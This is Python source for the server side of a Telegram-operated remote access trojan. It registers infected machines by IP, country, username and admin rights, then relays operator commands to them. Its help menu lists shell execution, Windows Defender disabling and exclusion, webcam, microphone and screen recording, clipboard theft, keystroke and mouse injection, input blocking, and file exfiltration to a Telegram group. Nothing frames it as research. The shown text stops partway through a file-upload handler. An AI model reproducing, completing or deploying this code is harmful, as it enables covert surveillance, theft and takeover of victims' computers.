import asyncio
import json
import logging
import tempfile
import time
import aiohttp
import os
from datetime import datetime
import io
import aiofiles 
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, BaseFilter, CommandObject
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardButton, 
    FSInputFile, 
    ContentType
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s',
                    handlers=[logging.StreamHandler(), logging.FileHandler('server.log', encoding='utf-8')])
logger = logging.getLogger(__name__)

DATA = {}

# Reading the file 'data_info.txt'
try:
    with open('data_info.txt', 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            
            if '=' in line:
                key, value = line.split('=', 1)
                DATA[key.strip()] = value.strip()

except FileNotFoundError:
    logger.error("Critical error: File 'data_info.txt' not found. Check path.")

# Assigning read values ​​to variables
try:
    TOKEN = DATA['TOKEN']
    GROUP_CHAT_ID = int(DATA['GROUP_CHAT_ID']) 

except KeyError as e:
    logger.error(f"Error: Key {e} not found in File 'data_info.txt'.")
except ValueError:
    
# This error will be thrown if the value is not a number
    logger.error("Error: GROUP_CHAT_ID must be a valid integer.")

bot = Bot(TOKEN)
dp = Dispatcher()

clients = {}
upload_requests = {}
clients_lock = asyncio.Lock()
HOST = '0.0.0.0'
PORT = 7777 # Change to your own
HISTORY_FILE = "client_history.json"
clients = {}
CLIENT_HISTORY_CACHE = {}
clients_lock = asyncio.Lock()
BOT_USERNAME = ""

class IsInGroup(BaseFilter):
    async def __call__(self, message: Message) -> bool:
        return message.chat.id == GROUP_CHAT_ID

def is_valid_filename(filename):
    invalid = '<>:"/\\|?*'
    return filename and all(c not in invalid for c in filename) and filename.strip() not in ['.', '..']

async def read_json(reader):
    """Reads a single JSON command (only the line up to \n)."""
    line = await reader.readline()
    if not line:
        return None
    return json.loads(line.decode('utf-8'))


async def find_client_by_thread(thread_id):
    # Convert ID to int for correct comparison (Telegram ID is always int)
    try:
        thread_id = int(thread_id)
    except (ValueError, TypeError):
        return None, None, None

    # clients_lock for safe reading
    async with clients_lock:
        # We go through all active clients
        for client_id, data in clients.items():
            if data.get("thread_id") == thread_id:
                # Found: Returning the client ID, Reader, and Writer
                return client_id, data["reader"], data["writer"] 
    return None, None, None

    
async def load_client_history():
    """Asynchronously loads customer history from a file."""
    try:
        async with aiofiles.open(HISTORY_FILE, mode='r', encoding='utf-8') as f:
            content = await f.read()
            if content:
                # 🔥 Converting string dates back to datetime objects
                history_data = json.loads(content)
                for client_id, data in history_data.items():
                    if 'last_offline' in data and data['last_offline']:
                        data['last_offline'] = datetime.fromisoformat(data['last_offline'])
                    # --- NEW LINE: Adding first_seen ---
                    if 'first_seen' in data and data['first_seen']:
                        data['first_seen'] = datetime.fromisoformat(data['first_seen'])
                    # -------------------------------------
                return history_data
            return {}
    except FileNotFoundError:
        return {}
    except Exception as e:
        logger.error(f"Error loading customer history: {e}")
        return {}

async def save_client_history(history_data):
    # Asynchronously saves customer history to a file.
    try:
        # Important: make a copy for modification, so as not to change the cache itself!
        data_to_save = history_data.copy()
        
        for client_id, data in data_to_save.items():
            
            # --- Fix for 'last_offline' ---
            last_offline = data.get('last_offline')
            if isinstance(last_offline, datetime):
                # If this is a datetime object, convert it to a string
                data['last_offline'] = last_offline.isoformat()
            
            # --- Fix for 'first_seen' ---
            first_seen = data.get('first_seen')
            if isinstance(first_seen, datetime):
                # If this is a datetime object, convert it to a string
                data['first_seen'] = first_seen.isoformat()
            # If it is a string or None, leave it as is.
                
        async with aiofiles.open(HISTORY_FILE, mode='w', encoding='utf-8') as f:
            await f.write(json.dumps(data_to_save, ensure_ascii=False, indent=4))
    except Exception as e:
        # This error should not occur now
        logger.error(f"Error saving customer history: {e}")


async def send_client_command(message: Message, command: str):
    # Finds the client and sends the command
    
    thread_id = message.message_thread_id if message.message_thread_id else message.chat.id
    try:
        # find_client_by_thread must be defined in your server.py
        _, _, writer = await find_client_by_thread(thread_id)
    except KeyError:
        await message.reply("❌ Offline (Client search error)")
        return
        
    if not writer:
        await message.reply("❌ Offline")
        return
        
    try:
        payload = json.dumps({"command": command}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
        await message.reply(f"✅ The command has been sent to the client.: `{command}`", parse_mode='Markdown')
    except Exception as e:
        await message.reply(f"❌ Send error: {e}")

async def get_flag_and_country(ip):
    if ip in ["127.0.0.1", "localhost", "0.0.0.0"] or ip.startswith("192.168."):
        return "🏠", "Local"
    try:
        async with aiohttp.ClientSession() as session:
            # We use free API (ip-api.com)
            async with session.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=3) as resp:
                data = await resp.json()
                cc = data.get("countryCode", "XX").upper()
                
                # The magic of turning country codes (US, RU) into flag emojis
                offset = 127397
                flag = "".join([chr(ord(c) + offset) for c in cc])
                return flag, cc
    except:
        return "🏳️", "??"
        
async def handle_client(reader, writer):
    global CLIENT_HISTORY_CACHE # 🔥 Using a global cache
    
    # Initializing variables for a secure scope
    client_id = None
    thread_id = None
    
    # 🔥 Getting addr and saving the current writer
    try:
        addr = writer.get_extra_info('peername')
    except Exception:
        addr = ('Unknown IP', 0)
        
    current_writer = writer # Keep a reference to the current writer to protect against race conditions
    
    try:
        # 1. Handshake
        line = await reader.readline()
        if not line.endswith(b'\n'):
            return
        handshake = json.loads(line.rstrip(b'\n').decode('utf-8'))
        client_id = handshake.get("client_id", "").strip()

        client_ip = addr[0]
        # Use the data from the handshake as the source (or {} if there is none)
        client_info = handshake.get("info", {}) 
        thread_id = None

        if not client_id or len(client_id) < 5:
            return
        logger.info(f"Client {client_id} Connected {addr}")

        # 2. Topic / Registration (With CLIENT_HISTORY_CACHE logic)
        async with clients_lock:
            
            if client_id in CLIENT_HISTORY_CACHE:
                thread_id = CLIENT_HISTORY_CACHE[client_id].get('thread_id')
                first_seen_date = CLIENT_HISTORY_CACHE[client_id].get('first_seen')
                
                # If there is no first_seen in the history (old entry), set it now
                if not first_seen_date:
                    first_seen_date = datetime.now()
            else:
                # This is a completely new client
                thread_id = None # Will be created below
                first_seen_date = datetime.now()

            # 2.1. Finding an existing thread_id in history
            # 🔥 We use only CLIENT_HISTORY_CACHE
            if client_id in CLIENT_HISTORY_CACHE:
                thread_id = CLIENT_HISTORY_CACHE[client_id]['thread_id']
                client_info = CLIENT_HISTORY_CACHE[client_id].get('info', client_info)
                client_ip = CLIENT_HISTORY_CACHE[client_id].get('ip', client_ip)

                

            if client_id in clients:
                # Client reconnected: use existing thread_id and update data
                thread_id = clients[client_id]["thread_id"] 
                clients[client_id].update({
                    "writer": writer, 
                    "reader": reader, 
                    "last_seen": datetime.now(), 
                    "addr": addr
                })
                
                # 🔥 If the client was offline, reset last_offline and save
                if client_id in CLIENT_HISTORY_CACHE:
                    CLIENT_HISTORY_CACHE[client_id]['last_offline'] = None 
                    CLIENT_HISTORY_CACHE[client_id]['first_seen'] = first_seen_date
                    await save_client_history(CLIENT_HISTORY_CACHE)

            else:
                # New client: create a topic if thread_id is not found
                if not thread_id:
                    try:
                        # === GENERATE THE PERFECT NAME ===
                        client_ip = addr[0]
                        flag, _ = await get_flag_and_country(client_ip)
                        
                        os_name = client_info.get("os", "Win")
                        user = client_info.get("user", "User")
                        is_admin = client_info.get("is_admin", False)
                        
                        admin_icon = "⚡" if is_admin else "👤"
                        
                        # Form the string: 🇺🇸 Win 10 | ⚡ Admin | 88.21.33.12
                       # Truncate the username if it is too long
                        topic_name = f"{flag} {os_name} | {admin_icon} {user[:10]} | {client_ip}"
                        
                        # Create a topic with a BEAUTIFUL name
                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=topic_name)
                        thread_id = topic.message_thread_id
                        # ==================================
                    except Exception as e:
                        logger.error(f"Topic error: {e}")
                        thread_id = None
                        
                # 2.2. Record/update the client in the active list and in the history
                clients[client_id] = {
                    "writer": writer,
                    "reader": reader,
                    "thread_id": thread_id,
                    "last_seen": datetime.now(),
                    "addr": addr
                }
                
                # 🔥 Updating CLIENT_HISTORY_CACHE
                CLIENT_HISTORY_CACHE[client_id] = {
                    "thread_id": thread_id,
                    "last_offline": None, #Online
                    "first_seen": first_seen_date, # NEW: Use the date defined above
                    'info': client_info, # <---NOW STORING!
                    'ip': client_ip      # <---NOW STORING!
                }
                await save_client_history(CLIENT_HISTORY_CACHE)
                
        if thread_id:
            try:
                # 1. Attempting to send a message to an existing topic
                await bot.send_message(GROUP_CHAT_ID, f"✅ {client_id} Online", message_thread_id=thread_id)
            except Exception as e:
                logger.error(f"Error sending 'online' message to topic {thread_id} for {client_id}: {e}")
                
                # If an error occurs (Bad Request: message thread not found), 
                # topic has probably been deleted. Trying to create a new one.
                if "thread not found" in str(e) or "Bad Request" in str(e):
                    logger.info(f"Topic {thread_id} for {client_id} not found. Trying to recreate...")
                    new_thread_id = None
                    
                    try:
                        # 💥 REPEAT ATTEMPT TO CREATE A TOPIC
                        
                        # client_ip and client_info are now available and initialized!
                        flag, _ = await get_flag_and_country(client_ip) 
                        
                        os_name = client_info.get("os", "Win") 
                        user = client_info.get("user", "User")
                        is_admin = client_info.get("is_admin", False)
                        
                        admin_icon = "⚡" if is_admin else "👤"
                        # Use the variables defined at the beginning of the function
                        topic_name = f"{flag} {os_name} | {admin_icon} {user[:10]} | {client_ip}"
                        
                        # Create a topic
                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=topic_name)
                        new_thread_id = topic.message_thread_id
                        
                        # BE SURE TO UPDATE THE CACHE and the list of active clients
                        async with clients_lock:
                            # Update the active client
                            if client_id in clients:
                                clients[client_id]["thread_id"] = new_thread_id
                            
                            # Update history and save to disk
                            if client_id in CLIENT_HISTORY_CACHE:
                                CLIENT_HISTORY_CACHE[client_id]['thread_id'] = new_thread_id
                                await save_client_history(CLIENT_HISTORY_CACHE)
                                
                        thread_id = new_thread_id

                        # Send a message to a new topic
                        if new_thread_id:
                            await bot.send_message(GROUP_CHAT_ID, 
                                                   f"✅ Client {client_id} is online. ⚠️ The topic was deleted, but was successfully recreated with ID: {new_thread_id}", 
                                                   message_thread_id=new_thread_id)
                        
                    except Exception as create_e:
                        logger.error(f"Critical error when re-creating a topic for {client_id}: {create_e}")
                        await bot.send_message(GROUP_CHAT_ID, 
                                               f"❌ Critical error: Client {client_id} is online, but the topic has not been created: {create_e}")

        #3. Data cycle (С Heartbeat)
        while True:
            try:
                # 🔥 HEARTBEAT: Reading timeout 20 seconds
                line = await asyncio.wait_for(reader.readline(), timeout=25)

                if not line: # EOF (the client closed the socket correctly)
                    break
                    
                if b'\x00' in line or any(b > 0xF4 for b in line):
                    # this is a binary → ignore until the end of the line
                    continue

            except (asyncio.TimeoutError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
                logger.warning(f"Read timeout from {client_id}. Connection terminated.")
                break # Exit loop, finally trigger
                
            except Exception as e:
                # Now these are really strange errors
                logger.error(f"Unexpected error reading {client_id}: {e}")
                break
            
            if not line.endswith(b'\n'):
                break
        
            line = line.rstrip(b'\n')
            if not line:
                continue

            clean = line.strip()    

            if not line.startswith(b'{'):
                logger.warning(f"Missing binary/garbage string from{client_id}")
                continue
                
            try:
                res = json.loads(line.decode('utf-8'))
                command_name = res.get('command')
                
              # 🔥 PING PROCESSING
                if command_name and command_name.lower().strip() == "/ping":
                    async with clients_lock:
                        if client_id in clients:
                            clients[client_id]["last_seen"] = datetime.now()
                    continue

                # 🔥 BLOCK 1: PROCESSING FILE RESPONSE FOR /tasklist and /execute
                if command_name == "/response_file":
                    file_name = res.get("file_name", "output.txt")
                    file_size = int(res.get("file_size", 0))
                
                    if file_size <= 0 or file_size > 200 * 1024 * 1024:
                       logger.error(f"Invalid file size: {file_size}")
                        continue
                
                    # Read binary data strictly by file_size
                    file_data = await reader.readexactly(file_size)
                
                    # Save
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix=f"_{file_name}") as tmp:
                        tmp.write(file_data)
                        temp_file_path = tmp.name
                
                   # Send to Telegram
                    tg_file = FSInputFile(temp_file_path, filename=file_name)
                    caption = res.get("result", f"File {file_name}")
                
                    await bot.send_document(
                        chat_id=GROUP_CHAT_ID,
                        document=tg_file,
                        caption=caption,
                        message_thread_id=thread_id,
                        parse_mode='Markdown'
                    )
                
                    os.remove(temp_file_path)
                    continue

                
                # --------------------------------------------------------------------------------------
                # BLOCK 2 (Processing simple text result)
                if "result" in res:
                    text_from_client = res["result"]
                    
                    try:
                        # ✅ FIXED: Added parse_mode='Markdown'
                        await bot.send_message(
                            GROUP_CHAT_ID, 
                            text_from_client, 
                            message_thread_id=thread_id, 
                            parse_mode='Markdown' 
                        )
                    except Exception as e:
                        # If Markdown is broken, send it as plain text
                        logger.warning(f"Error parsing Markdown ({client_id}): {e}. Sending to Plain Text.")
                        await bot.send_message(GROUP_CHAT_ID, text_from_client, message_thread_id=thread_id)
                        
                    continue
                    
               # BLOCK 3: OLD CODE (Processing other files initiated by the Client, for example, screenshots)
                if "file_name" in res and "file_size" in res:
                    name = res["file_name"]
                    size = int(res["file_size"])
                    if size <= 0 or size > 50 * 1024 * 1024:
                        await reader.readexactly(size)
                        await bot.send_message(GROUP_CHAT_ID, "❌ The file is broken or large", message_thread_id=thread_id)
                        continue
                    data = b''
                    while len(data) < size:
                        chunk = await reader.read(min(8192, size - len(data)))
                        if not chunk:
                            raise ConnectionError("File break")
                        data += chunk
                    if len(data) != size:
                        await bot.send_message(GROUP_CHAT_ID, "❌ Incomplete file", message_thread_id=thread_id)
                        continue
                    suffix = os.path.splitext(name)[1] or ".bin"
                    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
                        tmp.write(data)
                        tmp_path = tmp.name
                    try:
                        caption = f"{client_id}: {name} ({size}B)"
                        if name.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                            await bot.send_photo(GROUP_CHAT_ID, FSInputFile(tmp_path), caption=caption, message_thread_id=thread_id)
                        else:
                            await bot.send_document(GROUP_CHAT_ID, FSInputFile(tmp_path), caption=caption, message_thread_id=thread_id)
                        logger.info(f"File {name} от {client_id} sent to TG")
                    except Exception as tg_e:
                        logger.error(f"TG error: {tg_e}")
                        await bot.send_message(GROUP_CHAT_ID, f"❌ TG: {tg_e}", message_thread_id=thread_id)
                    finally:
                        os.unlink(tmp_path)
                    continue
            except json.JSONDecodeError:
                continue
            except Exception as e:
                logger.error(f"Processing: {e}")
                
    except Exception as e:
        log_id = client_id if client_id else str(addr)
        logger.error(f"Crete: {log_id}: {e}")
        
    finally:
        log_id = client_id if client_id else str(addr)
        logger.info(f"Disabled {log_id}")

        #1. Removing a client from the list (Protection against deletion race)
        should_delete = False
        if client_id:
            async with clients_lock:
                # IMPORTANT: ONLY DELETE IF OUR WRITER IS STILL ACTIVE (PREVENTING A NEW CONNECTION TO BE DELETED)
                if client_id in clients and clients[client_id].get('writer') is current_writer:
                    del clients[client_id]
                    should_delete = True
                    
                    # 🔥 UPDATE HISTORY (Setting the last visit time)
                    if client_id in CLIENT_HISTORY_CACHE:
                        CLIENT_HISTORY_CACHE[client_id]['last_offline'] = datetime.now()
                        await save_client_history(CLIENT_HISTORY_CACHE)
                else:
                    # If the client reconnects, simply reset the old descriptors
                    if client_id in clients:
                        clients[client_id]["writer"] = None
                        clients[client_id]["reader"] = None


        #2. Send a disconnect message only if WE HAVE REMOVED THE CLIENT
        if should_delete and client_id and thread_id:
            try:
                await bot.send_message(
                    GROUP_CHAT_ID, 
                    f"🔴 *Client {client_id} has gone offline!*",
                    message_thread_id=thread_id,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error sending Offline message: {e}")

        #3. Quietly closing the writer (suppressing ConnectionResetError)
        if writer:
            try:
                writer.close()
                # We give the socket 1 second to close; if it doesn’t have time, we ignore it.
                # This will prevent the handle_client function from hanging for a long time.
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except (ConnectionResetError, ConnectionAbortedError, OSError, asyncio.TimeoutError):
       # OSError: [Errno 113] No route to host will fall here and will not spam the console
                pass 
            except Exception as e:
                logger.debug(f"Silenced closing error: {e}")
                
async def tcp_server():
    server = await asyncio.start_server(handle_client, HOST, PORT)
    logger.info(f"Server on {HOST}:{PORT}")
    async with server:
        await server.serve_forever()

async def check_clients_status():
    while True:
        # Reduce to 60 seconds to respond faster to lags
        await asyncio.sleep(60) 
        now = datetime.now()
        
        async with clients_lock:
            dead = []
            for cid, info in clients.items():
                last_diff = (now - info["last_seen"]).total_seconds()
                
               # Condition 1: Your original logic (already fallen off)
                condition_orig = info["writer"] is None and last_diff > 600
                
                # Condition 2: We add -if there is a writer, but there is no news from him > 45 sec
                # (assuming that the client sends pings every 5-10 seconds)
                condition_ghost = info["writer"] is not None and last_diff > 45
                
                if condition_orig or condition_ghost:
                    dead.append(cid)

            for cid in dead:
                try:
                    tid = clients[cid].get("thread_id")
                    writer = clients[cid].get("writer")
                    
                   # If the connection is “ghost”, close it forcibly
                    if writer:
                        writer.close()
                        # It is not necessary to wait for drain here, because we are in a cleaning cycle
                    
                    if tid:
                        # Your standard notification
                        await bot.send_message(GROUP_CHAT_ID, f"⏰ Timeout/Out of Synchronization {cid}", message_thread_id=tid)
                except Exception as e:
                    logger.error(f"Error deleting {cid}: {e}")
                finally:
                    if cid in clients:
                        del clients[cid]


# ====== TG handlers ======
def get_main_menu():
    builder = InlineKeyboardBuilder()
    # Add category buttons strictly according to your names
    builder.add(InlineKeyboardButton(text="📁 File Manager", callback_data="menu_files"))
    builder.add(InlineKeyboardButton(text="📥 Transfer Files", callback_data="menu_transfer"))
    builder.add(InlineKeyboardButton(text="⚙️ System and execution", callback_data="menu_sys"))
    builder.add(InlineKeyboardButton(text="💬 Interface", callback_data="menu_interface"))
    builder.add(InlineKeyboardButton(text="🖱️ Control", callback_data="menu_input"))
    builder.add(InlineKeyboardButton(text="👾 Automation", callback_data="menu_auto"))
    builder.add(InlineKeyboardButton(text="🔇 Multimedia", callback_data="menu_media"))
    builder.add(InlineKeyboardButton(text="🔧 Other", callback_data="menu_other"))
    
    builder.adjust(2) # Group 2 buttons per line
    
    # Close button in a separate line at the bottom
    builder.row(InlineKeyboardButton(text="❌ Close Menu", callback_data="menu_close"))
    return builder.as_markup()

# === HANDLERS ===

@dp.message(Command('help'))
async def handle_help(message: Message):
    # Main text when calling /help
    help_main_text = "🎄<b>Control Panel\n❄️Select a category to view available commands:</b>"
    await message.reply(help_main_text, parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data.startswith("menu_"))
async def process_menu_navigation(callback: CallbackQuery):
    menu_type = callback.data.split("_")[1]
    builder = InlineKeyboardBuilder()
    
   # Default text to prevent UnboundLocalError
    text = "🎄<b>Control Panel\n❄️Select a category to view available commands:</b>"

    #1. Delete logic (Close)
    if menu_type == "close":
        await callback.message.delete()
        await callback.answer("Menu closed")
        return

    #2. Logic for returning to the main menu
    if menu_type == "main":
        await callback.message.edit_text(text, reply_markup=get_main_menu(), parse_mode="HTML")
        await callback.answer()
        return

    # ---CATEGORIES (Original texts without distortion) ---
    if menu_type == "files":
        text = """<b>📁 File manager</b>
<code>/ls [path]</code> -list of Files/folders (at the root <code>/</code> -drives)
<code>/cd <path></code> -change directory
<code>/back</code> -go back (from the root of the disk -to the list of disks)
<code>/pwd</code> -show current path
<code>/mkdir <name></code> -create a folder
<code>/delete <name></code> -delete a File or folder
<code>/rename <old>/n<new></code> -rename
<code>/copy <source>/to<destination></code> -copy
<code>/move <source>/to<destination></code> -move"""

    elif menu_type == "transfer":
        text = """<b>📥 Transferring Files</b>
<code>/download <File></code> -download File from the client in Telegram
<code>/upload [name]</code> -upload File from Telegram to the client (response to File)
<code>/download_link <URL> [0]</code> -download File via link (<code>0</code> -without launching)"""

    elif menu_type == "sys":
        text = """<b>⚙️ System and execution</b>
<code>/run <File></code> -run the program/File
<code>/execute <command></code> -execute CMD/PowerShell
<code>/sysinfo</code> -system information (CPU, memory, disk)
<code>/tasklist</code> -list of processes (sending TXT)
<code>/taskkill <name.exe or PID></code> -kill the process
<code>/restart</code>(unstable) -restart the client
<code>/cmdbomb</code> -open 10 CMD windows
<code>/wd_exclude [path]</code> -add the source/specified File to the Win.Def exception 
<code>/killwindef</code> -temporarily kill Win.Def
<code>/grant <path></code> -get access to the folder/File (TakeOwn/Icacls)"""

    elif menu_type == "interface":
        text = """<b>💬 Interface and notifications</b>
<code>/msg [type] [title]/t<text></code> — show the window on the client
<code>/changeclipboard <text></code> -set the contents of the clipboard
<code>/clipboard</code> -get the contents of the clipboard"""

    elif menu_type == "input":
        text = """<b>🖱️ Input and screen controls</b>
<code>/screenshot</code> or <code>/sc</code> -screenshot
<code>/photo [index]</code> -photo from webcam
<code>/minimize</code> — minimize the active window
<code>/maximize</code> — maximize the active window
<code>/altf4</code> -close the active window
<code>/keypress <keys></code> -press a combination (for example: <code>alt f4</code>, <code>win r</code>)
<code>/holdkey <sec> <keys></code> -hold down the key/keys for N seconds
<code>/mouseclick</code> -mouse click
<code>/mousemove <X> <Y></code> -move the cursor
<code>/keytype <text></code> -enter text (with Cyrillic support)
<code>/open_image <sec> <path></code> -open the image full screen for N seconds
<code>/applist [<index>]</code> -view a list of windows or bring one of them forward.
<code>/applist_close <index></code> -close the selected window.
<code>/applist_title <index> <new name></code> -Rename the selected window
<code>/whereami</code> -path to the current exe"""

    elif menu_type == "auto":
        text = """<b>👾 Automation</b>
<code>/mousemesstart</code> -enable random mouse movement
<code>/mousemesstop</code> -stop mouse chaos
<code>/auto <sec> [screen|webcam|both] [ind. cameras]</code> -auto-send screenshots/photos
<code>/stop</code> — stop <code>/auto</code>"""

    elif menu_type == "media":
        text = """<b>🔇 Multimedia</b>
<code>/playsound <path></code> -play an audioFile on the client
<code>/stopsound</code> -stop playback
<code>/mic <sec></code> – recording from a microphone (up to 30 sec)
<code>/webcam <index> <sec></code> – recording video from the camera (up to 30 sec)
<code>/screenrecord <sec></code> – record video from the screen (up to 60 sec)
<code>/volumeplus [N]</code> -increase volume (default +2%)
<code>/volumeminus [N]</code> -reduce volume (default -2%)"""

    elif menu_type == "other":
        text = """<b>🔧 Other</b>
<code>/wallpaper <path></code> -set wallpaper
<code>/block</code> -block mouse and keyboard
<code>/unblock</code> -unblock input
<code>/location</code> -sending the location (country, city, etc.) of the client
<code>/update [pastebin raw]</code> -update the version on the client side
<code>/clients</code> -view active clients and their history
<code>/version</code> -view the software version on the client side

<i>ver beta v35</i>"""

    # Add control buttons to the submenu
    builder.row(InlineKeyboardButton(text="🔙 Back", callback_data="menu_main"))
    builder.add(InlineKeyboardButton(text="❌ Close", callback_data="menu_close"))
    
    await callback.message.edit_text(
        text, 
        parse_mode="HTML", 
        reply_markup=builder.as_markup(),
        disable_web_page_preview=True
    )
    await callback.answer()

async def get_client_status(client_id):
    """Returns the client status: 🟢 (online) or ⚫ (offline with date)."""
    global CLIENT_HISTORY_CACHE
    
    first_seen_str = ""
    # Retrieve and format first_seen from cache
    if client_id in CLIENT_HISTORY_CACHE:
        first_seen = CLIENT_HISTORY_CACHE[client_id].get('first_seen')
        if first_seen:
            # Convert if string, format otherwise
            if isinstance(first_seen, str):
                try:
                    first_seen = datetime.fromisoformat(first_seen)
                except ValueError:
                    first_seen = None
            
            if isinstance(first_seen, datetime):
                # 🔥 CHANGED FORMAT OF FIRST CONNECTION DATE
                first_seen_str = f" (С: {first_seen.strftime('%d.%m.%Y')})" 
        
    async with clients_lock:
        # 1. Checking active clients
        if client_id in clients and clients[client_id].get('writer'):
            # 🔥 CHANGED TIME FORMAT OF LAST VISIT: only time
            last_seen_time = clients[client_id]['last_seen'].strftime("%H:%M:%S")
            return f"🟢 *Online*(Seen: {last_seen_time}){first_seen_str}"
            
        # 2. Checking the history (Offline)
        if client_id in CLIENT_HISTORY_CACHE:
            last_offline = CLIENT_HISTORY_CACHE[client_id].get('last_offline')
            if last_offline:
                if isinstance(last_offline, str):
                    try:
                        last_offline = datetime.fromisoformat(last_offline)
                        CLIENT_HISTORY_CACHE[client_id]['last_offline'] = last_offline
                    except ValueError:
                        # If there is an error, print a shorter error message
                        return f"⚫ Offline (Дата ошибки){first_seen_str}"

                # 🔥 CHANGED TIME FORMAT OF LAST VISIT: date and time
                offline_time = last_offline.strftime("%d.%m %H:%M") 
                return f"⚫ *Offline* (Was: {offline_time}){first_seen_str}" 
                
        return f"❓ *Unknown*{first_seen_str}"


@dp.message(Command('clients'), IsInGroup())
async def handle_clients(message: Message):
    global CLIENT_HISTORY_CACHE, GROUP_CHAT_ID 

    async with clients_lock:
        active_ids = list(clients.keys())

    # Count the quantity
    clients_count = len(active_ids)

    if not active_ids:
        await message.reply("❌ No active clients.")
        return

    try:
        # Save -100 from ID chat for formation of links
        chat_id_for_url = str(GROUP_CHAT_ID)[4:] if str(GROUP_CHAT_ID).startswith("-100") else str(GROUP_CHAT_ID)
    except:
        chat_id_for_url = "ERROR_CHAT_ID"

    # Add quantity to title
    response = [f"🌐 *Active clients:*{clients_count}\n"]

    for client_id in sorted(active_ids):
        thread_id = CLIENT_HISTORY_CACHE.get(client_id, {}).get('thread_id', 0)
        status_line = await get_client_status(client_id)

        client_url = f"https://t.me/c/{chat_id_for_url}/{thread_id}"
        client_link = f"*{client_id}* ([→]({client_url}))"

        response.append(f"{client_link}\n{status_line}")
        response.append("-" * 30)

    # Remove the last dividing line, if there is one
    if response and response[-1].startswith("-"):
        response.pop()

    await message.reply('\n'.join(response), parse_mode='Markdown', disable_web_page_preview=True)

@dp.message(Command('clients_off'), IsInGroup())
async def handle_clients_off(message: Message):
    global CLIENT_HISTORY_CACHE, clients, GROUP_CHAT_ID

    async with clients_lock:
        active_ids = set(clients.keys())

    offline_ids = [cid for cid in CLIENT_HISTORY_CACHE if cid not in active_ids]

    if not offline_ids:
        await message.reply("No Offline clients.")
        return

    try:
        chat_id_for_url = str(GROUP_CHAT_ID)[4:]
    except:
        chat_id_for_url = "ERROR_CHAT_ID"

    response = ["*List of clients (Offline):*\n"]

    for client_id in sorted(offline_ids):
        thread_id = CLIENT_HISTORY_CACHE.get(client_id, {}).get('thread_id', 0)
        status_line = await get_client_status(client_id)

        client_url = f"https://t.me/c/{chat_id_for_url}/{thread_id}"
        client_link = f"*{client_id}* ([→]({client_url}))"

        response.append(f"{client_link}\n{status_line}")
        response.append("-" * 30)

    if response[-1].startswith("-"):
        response.pop()

    await message.reply('\n'.join(response), parse_mode='Markdown')


@dp.message(Command('download'), IsInGroup())
async def handle_download(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    fname = command.args.strip() if command.args else ""
    if not fname:
        await message.reply("❌ File name")
        return
    _, _, writer = await find_client_by_thread(thread_id)
    if not writer:
        await message.reply("❌ Client Offline")
        return
    try:
        payload = json.dumps({"command": f"/download {fname}"}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")


@dp.message(Command(commands=["upload"]), IsInGroup())
async def handle_upload_command(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    # Retrieve the argument (for example, "hello")
    args = command.args.strip() if command.args else ""
    
    # 1. Checking the client’s online status
    # find_client_by_thread now returns (cid, reader, writer)
    cid, _, writer = await find_client_by_thread(thread_id) 
    
    if not writer:
        await message.reply("❌Client Offline.")
        return

   # 2. Send a request and save the data
    desired_name = args if args else "default"
    
    # Send a message that the user must respond to
    prompt_msg = await message.reply(f"✅ Ready to download. Reply to this message with File. Desired name: {desired_name}")
    
    # Save the desired name tied to the response message ID
    upload_requests[prompt_msg.message_id] = {
        "client_id": cid,
        "filename": args # Save the desired name (“hello”)
    }


@dp.message(Command(commands=['screenshot', 'sc', 'photo', 'auto', 'stop']), IsInGroup())
async def handle_special(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    cmd = f"/{command.command}"
    args = command.args or ""
    full = f"{cmd} {args}".strip()
    _, _, writer = await find_client_by_thread(thread_id)
    if not writer:
        await message.reply("❌ Offline")
        return
    try:
        payload = json.dumps({"command": full}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")

@dp.message(F.content_type.in_({ContentType.DOCUMENT, ContentType.PHOTO, ContentType.AUDIO, ContentType.VIDEO, ContentType.VOICE, ContentType.VIDEO_NOTE, ContentType.ANIMATION}), IsInGroup())
async def handle_file(message: Message):
    
    # 1. Looking for a request in upload_requests
    req = None
    if message.reply_to_message and message.reply_to_message.message_id in upload_requests:
        req = upload_requests.pop(message.reply_to_message.message_id)
        cid = req["client_id"]
        base_name = req["filename"]
    else:
       # If it's just a file uploaded without the /upload command, we can't rename it
        return
        
    await message.reply("⚙️ I'm downloading a file from Telegram...")

    # 2. ПОЛУЧЕНИЕ READER/WRITER
    async with clients_lock:
        client_info = clients.get(cid, {})
        reader = client_info.get("reader") 
        writer = client_info.get("writer")
    
    if not writer or not reader:
        await message.reply("❌ The client is offline or the socket is not ready.")
        return
    
    try:
        #3. FILE TYPE DETERMINATION
        file_obj = None
        
        if message.document:
            file_obj = message.document
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".bin"
        elif message.photo:
            file_obj = message.photo[-1]
            ext = ".jpg"
            orig_name = f"photo_{int(time.time())}.jpg" # Временное имя
        elif message.video:
            file_obj = message.video
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".mp4"
        elif message.audio:
            file_obj = message.audio
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".mp3"
        else:
            await message.reply("❌ File type not supported")
            return
        
        file_id = file_obj.file_id
        file_info = await bot.get_file(file_id)
        file_path = file_info.file_path
